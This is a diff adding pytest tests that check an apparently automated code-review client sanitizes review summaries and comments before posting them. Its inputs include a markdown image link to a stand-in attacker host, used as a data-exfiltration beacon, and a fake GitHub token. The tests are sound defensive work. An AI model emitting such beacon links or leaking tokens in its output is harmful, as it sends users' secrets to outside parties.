@@ -69,3 +69,51 @@ async def test_post_review_reports_and_logs_dropped_invalid_diff_comments(caplog
     assert "reason=line_not_in_diff" in caplog.text
     assert "severity=HIGH" in caplog.text
     assert "category=Silent Failures" in caplog.text
+
+
+@pytest.mark.asyncio
+async def test_post_review_sanitizes_summary_and_comment_bodies():
+    """The posted review is the egress path; secrets and live links must not ride it out."""
+    diff = "\n".join(
+        [
+            "diff --git a/file.py b/file.py",
+            "@@ -8,3 +8,3 @@",
+            " context",
+            "+added",
+            " context",
+        ]
+    )
+    comment = ReviewComment(
+        path="file.py",
+        line=9,
+        body="See ![](https://attacker.example/log?d=1) for details",
+        severity="HIGH",
+        category="Bugs",
+    )
+
+    client, mock_http = _make_client()
+    mock_http.post.return_value = _mock_response({"id": 123})
+
+    await client.post_review(
+        "owner/repo",
+        42,
+        ReviewResult(
+            summary="Key ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 leaked",
+            comments=[comment],
+        ),
+        diff=diff,
+    )
+
+    payload = mock_http.post.call_args.kwargs["json"]
+    assert "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" not in payload["body"]
+    assert "https://attacker.example" not in payload["comments"][0]["body"]
+
+
+@pytest.mark.asyncio
+async def test_post_comment_sanitizes_body():
+    client, mock_http = _make_client()
+    mock_http.post.return_value = _mock_response({"id": 7})
+
+    await client.post_comment("owner/repo", 42, "![](https://attacker.example/log?d=1)")
+
+    assert "https://attacker.example" not in mock_http.post.call_args.kwargs["json"]["body"]
